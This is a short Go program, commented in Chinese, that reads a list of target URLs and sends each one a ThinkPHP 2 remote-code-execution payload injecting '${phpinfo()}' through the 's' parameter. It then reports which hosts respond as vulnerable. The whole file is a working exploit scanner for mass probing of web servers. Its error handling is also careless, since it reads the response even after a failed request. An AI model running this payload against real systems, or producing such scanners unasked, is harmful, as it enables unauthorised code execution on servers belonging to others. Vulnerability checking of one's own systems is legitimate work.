package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func main() {
	//读取外部url文件
	urls, err := ioutil.ReadFile("urls.txt")
	if err != nil {
		fmt.Println(err)
	}

	for _, url := range strings.Split(string(urls), "\n") {
		//构造url
		target := url + "/index.php?s=1/2/3/${phpinfo()}"
		//构造请求
		resp, err := http.Get(target)
		if err != nil {
			fmt.Println(err)
		}
		//读取响应
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(err)
		}
		//判断响应
		if strings.Contains(string(body), "Server API") {
			fmt.Println(url + " [+]存在ThinkPHP2 RCE漏洞")
		} else {
			fmt.Println(url + " [+]不存在ThinkPHP2 RCE漏洞")
		}
	}
}
